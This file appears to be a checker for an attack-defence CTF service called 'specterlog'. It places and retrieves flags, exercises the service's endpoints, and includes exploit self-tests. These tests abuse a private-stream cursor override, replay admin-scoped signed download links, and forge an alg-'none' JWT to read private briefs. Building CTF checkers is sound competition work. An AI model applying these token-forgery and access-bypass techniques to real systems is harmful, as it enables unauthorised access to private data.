from __future__ import annotations

import base64
import hashlib
import hmac
import json
import secrets
import time
from logging import LoggerAdapter
from typing import Any

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher
from httpx import AsyncClient

from client import (
    Credentials,
    ensure_status,
    fresh_creds,
    header_secret,
    json_or_mumble,
    login,
    me,
    noise_word,
    post_task,
    register,
    service_secret,
    with_timeout,
)


checker = Enochecker("specterlog", 8080)
app = lambda: checker.app


# -----------------------------------------------------------------------------
# helpers
# -----------------------------------------------------------------------------

def b64url(data: bytes | str) -> str:
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def sign_download(secret: str, case_id: str, handle: str, exp: int) -> str:
    body = f"{case_id}|{handle}|{exp}".encode("utf-8")
    return hmac.new(secret.encode("utf-8"), body, hashlib.sha256).hexdigest()


def forge_alg_none(brief_id: str) -> str:
    header = b64url(json.dumps({"alg": "none", "typ": "view"}, separators=(",", ":")))
    claims = b64url(json.dumps({
        "sub": "atk",
        "scope": "briefs:read",
        "brief_id": brief_id,
        "exp": int(time.time()) + 600,
    }, separators=(",", ":")))
    return f"{header}.{claims}."


# -----------------------------------------------------------------------------
# PUTFLAG / GETFLAG variant 0 — incident
# -----------------------------------------------------------------------------

@checker.putflag(0)
async def putflag_incident(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(
        client,
        "PUTFLAG",
        task.current_round_id,
        0,
        flag=task.flag,
    )
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_incident: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 0:
        raise MumbleException("putflag_incident: wrong variant in attack_info")
    await db.set("v0", {"info": info, "flag": task.flag})
    return json.dumps(info)


@checker.getflag(0)
async def getflag_incident(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v0")
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_incident: flag drift in db")
    await post_task(
        client,
        "GETFLAG",
        task.current_round_id,
        0,
        flag=task.flag,
        attack_info=json.dumps(saved["info"]),
    )
    r = await client.get("/api/events")
    await ensure_status(r, 200, "getflag_incident events")
    body = await json_or_mumble(r, "getflag_incident events")
    events = body.get("events") or []
    archive = saved["info"].get("b")
    if not any(ev.get("archive") == archive for ev in events):
        raise MumbleException("incident archive missing from listing")


# -----------------------------------------------------------------------------
# PUTFLAG / GETFLAG variant 1 — evidence attachment
# -----------------------------------------------------------------------------

@checker.putflag(1)
async def putflag_evidence(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(
        client,
        "PUTFLAG",
        task.current_round_id,
        1,
        flag=task.flag,
    )
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_evidence: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 1:
        raise MumbleException("putflag_evidence: wrong variant in attack_info")
    for required in ("a", "b", "exp", "sig"):
        if required not in info:
            raise MumbleException(f"putflag_evidence: missing {required}")
    await db.set("v1", {"info": info, "flag": task.flag})
    return json.dumps(info)


@checker.getflag(1)
async def getflag_evidence(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v1")
    info = saved["info"]
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_evidence: flag drift in db")
    await post_task(
        client,
        "GETFLAG",
        task.current_round_id,
        1,
        flag=task.flag,
        attack_info=json.dumps(info),
    )
    listing = await client.get(f"/api/cases/{info['a']}/attachments", headers=header_secret())
    if listing.status_code not in (200, 403):
        raise MumbleException(f"getflag_evidence: listing http {listing.status_code}")


# -----------------------------------------------------------------------------
# PUTFLAG / GETFLAG variant 2 — directive brief
# -----------------------------------------------------------------------------

@checker.putflag(2)
async def putflag_directive(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(
        client,
        "PUTFLAG",
        task.current_round_id,
        2,
        flag=task.flag,
    )
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_directive: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 2:
        raise MumbleException("putflag_directive: wrong variant in attack_info")
    await db.set("v2", {"info": info, "flag": task.flag})
    return json.dumps(info)


@checker.getflag(2)
async def getflag_directive(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v2")
    info = saved["info"]
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_directive: flag drift in db")
    r = await post_task(
        client,
        "GETFLAG",
        task.current_round_id,
        2,
        flag=task.flag,
        attack_info=json.dumps(info),
    )


# -----------------------------------------------------------------------------
# PUTNOISE / GETNOISE for the three flagstores
# -----------------------------------------------------------------------------

@checker.putnoise(0)
async def putnoise_event(
    task: PutnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 0)


@checker.getnoise(0)
async def getnoise_event(
    task: GetnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 0)
    r = await client.get("/api/events")
    await ensure_status(r, 200, "getnoise_event events")
    body = await json_or_mumble(r, "getnoise_event events")
    if not isinstance(body.get("events"), list):
        raise MumbleException("getnoise_event: bad events shape")


@checker.putnoise(1)
async def putnoise_attachment(
    task: PutnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 1)


@checker.getnoise(1)
async def getnoise_attachment(
    task: GetnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 1)


@checker.putnoise(2)
async def putnoise_brief(
    task: PutnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 2)


@checker.getnoise(2)
async def getnoise_brief(
    task: GetnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 2)
    r = await client.get("/api/briefs?limit=20")
    await ensure_status(r, 200, "getnoise_brief listing")
    body = await json_or_mumble(r, "getnoise_brief listing")
    if not isinstance(body.get("briefs"), list):
        raise MumbleException("getnoise_brief: bad briefs shape")


# -----------------------------------------------------------------------------
# HAVOC — exercise every public endpoint
# -----------------------------------------------------------------------------

@checker.havoc(0)
async def havoc_cursor(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    health = await client.get("/health")
    await ensure_status(health, 200, "havoc cursor health")
    whoami = await client.get("/whoami")
    await ensure_status(whoami, 200, "havoc cursor whoami")
    cursor = await client.get("/api/cursor/public")
    await ensure_status(cursor, 200, "havoc cursor mint")
    cursor_body = await json_or_mumble(cursor, "havoc cursor mint")
    cursor_token = str(cursor_body.get("cursor") or "")
    if cursor_token.count(".") != 1:
        raise MumbleException("havoc cursor: malformed token")
    replay = await client.get("/api/replay", params={"cursor": cursor_token})
    await ensure_status(replay, 200, "havoc cursor replay")
    replay_body = await json_or_mumble(replay, "havoc cursor replay")
    if not isinstance(replay_body.get("events"), list):
        raise MumbleException("havoc cursor replay: shape")


@checker.havoc(1)
async def havoc_accounts(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    creds = fresh_creds("hv1")
    await register(client, creds.username, creds.password)
    info = await me(client)
    if info.get("username") != creds.username:
        raise MumbleException("havoc accounts: session not bound")
    r = await client.post("/api/accounts/logout")
    await ensure_status(r, 200, "havoc accounts logout")
    fail = await client.post(
        "/api/accounts/login",
        json={"username": creds.username, "password": "wrong"},
    )
    if fail.status_code != 401:
        raise MumbleException("havoc accounts: wrong password should fail")


@checker.havoc(2)
async def havoc_rate_limit(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    r = await client.get("/api/rate-limit/status")
    await ensure_status(r, 200, "havoc rate status")
    body = await json_or_mumble(r, "havoc rate status")
    if "remaining" not in body:
        raise MumbleException("havoc rate status: shape")
    failures = 0
    for _ in range(40):
        bad = await client.post(
            "/api/accounts/login",
            json={"username": "nobody", "password": "x"},
        )
        if bad.status_code == 429:
            failures += 1
            break
    if failures == 0:
        raise MumbleException("rate limit did not trip after burst")


@checker.havoc(3)
async def havoc_cases_and_attachments(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    creds = fresh_creds("hv3")
    await register(client, creds.username, creds.password)
    create = await client.post(
        "/api/cases",
        json={"title": f"case {noise_word()}", "summary": "ops", "public": False},
    )
    await ensure_status(create, 200, "havoc case create")
    case = await json_or_mumble(create, "havoc case create")
    case_id = str(case["id"])
    body = noise_word(40).encode("utf-8")
    upload = await client.post(
        f"/api/cases/{case_id}/attachments",
        json={
            "filename": "note.bin",
            "content_type": "application/octet-stream",
            "data": base64.b64encode(body).decode("ascii"),
        },
    )
    await ensure_status(upload, 200, "havoc attachment upload")
    meta = await json_or_mumble(upload, "havoc attachment upload")
    raw = await client.get(f"/api/cases/{case_id}/attachments/{meta['handle']}/raw")
    await ensure_status(raw, 200, "havoc attachment raw")
    if raw.content != body:
        raise MumbleException("havoc attachment raw: body mismatch")
    share = await client.post(
        f"/api/cases/{case_id}/attachments/{meta['handle']}/share",
        json={"actor": "admin", "ttl": 600},
    )
    await ensure_status(share, 200, "havoc attachment share")
    share_body = await json_or_mumble(share, "havoc attachment share")
    download = await client.get(share_body["url"])
    await ensure_status(download, 200, "havoc share download")
    if download.content != body:
        raise MumbleException("havoc share download: body mismatch")


@checker.havoc(4)
async def havoc_briefs(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    creds = fresh_creds("hv4")
    await register(client, creds.username, creds.password)
    case_resp = await client.post(
        "/api/cases",
        json={"title": f"case {noise_word()}", "summary": "ops"},
    )
    await ensure_status(case_resp, 200, "havoc briefs case")
    case = await json_or_mumble(case_resp, "havoc briefs case")
    body = f"private body {noise_word(20)}"
    create = await client.post(
        "/api/briefs",
        json={"case_id": case["id"], "title": "writeup", "body": body, "public": False},
    )
    await ensure_status(create, 200, "havoc briefs create")
    brief = await json_or_mumble(create, "havoc briefs create")
    tok = await client.post(f"/api/briefs/{brief['id']}/token")
    await ensure_status(tok, 200, "havoc briefs token")
    tok_body = await json_or_mumble(tok, "havoc briefs token")
    view = await client.get(
        f"/api/briefs/{brief['id']}/view",
        headers={"Authorization": f"Bearer {tok_body['token']}"},
    )
    await ensure_status(view, 200, "havoc briefs view")
    view_body = await json_or_mumble(view, "havoc briefs view")
    if view_body.get("brief", {}).get("body") != body:
        raise MumbleException("havoc briefs view: body mismatch")
    comment = await client.post(
        f"/api/briefs/{brief['id']}/comment",
        json={"body": noise_word(10)},
    )
    await ensure_status(comment, 200, "havoc briefs comment")


@checker.havoc(5)
async def havoc_api_tokens(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    creds = fresh_creds("hv5")
    await register(client, creds.username, creds.password)
    mint = await client.post(
        "/api/tokens",
        json={"scopes": ["briefs:read"], "label": "checker", "ttl": 3600},
    )
    await ensure_status(mint, 200, "havoc tokens mint")
    mint_body = await json_or_mumble(mint, "havoc tokens mint")
    listing = await client.get("/api/tokens")
    await ensure_status(listing, 200, "havoc tokens list")
    revoke = await client.delete(
        f"/api/tokens/{mint_body['token'].split('_')[0]}_{mint_body['token'].split('_')[1][:6]}",
    )
    if revoke.status_code not in (200, 404):
        raise MumbleException(f"havoc tokens revoke: {revoke.status_code}")


@checker.havoc(6)
async def havoc_indexer(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    r = await client.get("/api/indexer/stats")
    await ensure_status(r, 200, "havoc indexer")
    body = await json_or_mumble(r, "havoc indexer")
    if "events" not in body:
        raise MumbleException("havoc indexer: shape")


@checker.havoc(7)
async def havoc_search_negative(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    r = await client.get(
        "/api/search",
        params={"filter": "public", "project": "meta"},
    )
    await ensure_status(r, 200, "havoc search meta")
    body = await json_or_mumble(r, "havoc search meta")
    rows = body.get("rows")
    if not isinstance(rows, list):
        raise MumbleException("havoc search: shape")
    for row in rows:
        if "body" in row:
            raise MumbleException("havoc search: meta projection leaked body field")


@checker.havoc(8)
async def havoc_archive_negative(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
) -> None:
    listing = await client.get("/api/events")
    await ensure_status(listing, 200, "havoc archive listing")
    body = await json_or_mumble(listing, "havoc archive listing")
    events = body.get("events") or []
    public_archives = [ev["archive"] for ev in events if ev.get("public")]
    if not public_archives:
        return
    target = public_archives[0]
    r = await client.get(f"/api/archive/{target}")
    await ensure_status(r, 200, "havoc archive read")
    arc = await json_or_mumble(r, "havoc archive read")
    for ev in arc.get("events", []):
        if not ev.get("public"):
            raise MumbleException("havoc archive: private event surfaced without window")


# -----------------------------------------------------------------------------
# EXPLOIT self-tests
# -----------------------------------------------------------------------------

@checker.exploit(0)
async def exploit_incident(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 0:
        raise InternalErrorException("exploit_incident: wrong variant")
    cursor_resp = await client.get("/api/cursor/public")
    await ensure_status(cursor_resp, 200, "exploit_incident cursor")
    cursor = (await json_or_mumble(cursor_resp, "exploit_incident cursor")).get("cursor")
    if not cursor:
        raise MumbleException("exploit_incident: missing cursor")
    r = await client.get(
        "/api/replay",
        params={"cursor": cursor, "mode": "delta", "stream": "private"},
    )
    await ensure_status(r, 200, "exploit_incident replay")
    body = await json_or_mumble(r, "exploit_incident replay")
    for ev in body.get("events", []):
        candidate = str(ev.get("body") or "")
        flag = searcher.search_flag(candidate)
        if flag:
            return flag
    raise MumbleException("exploit_incident: flag not found via cursor override")


@checker.exploit(1)
async def exploit_evidence(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 1:
        raise InternalErrorException("exploit_evidence: wrong variant")
    case_id = str(info["a"])
    handle = str(info["b"])
    exp = int(info["exp"])
    sig = str(info["sig"])
    r = await client.get(
        f"/api/cases/{case_id}/attach/{handle}",
        params={"sig": sig, "exp": exp, "actor": "admin"},
    )
    await ensure_status(r, 200, "exploit_evidence download")
    text = r.text
    flag = searcher.search_flag(text)
    if flag:
        return flag
    raise MumbleException("exploit_evidence: flag not in body")


@checker.exploit(2)
async def exploit_directive(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 2:
        raise InternalErrorException("exploit_directive: wrong variant")
    brief_id = str(info["a"])
    token = forge_alg_none(brief_id)
    r = await client.get(
        f"/api/briefs/{brief_id}/view",
        headers={"Authorization": f"Bearer {token}"},
    )
    await ensure_status(r, 200, "exploit_directive view")
    body = r.text
    flag = searcher.search_flag(body)
    if flag:
        return flag
    raise MumbleException("exploit_directive: flag not in body")
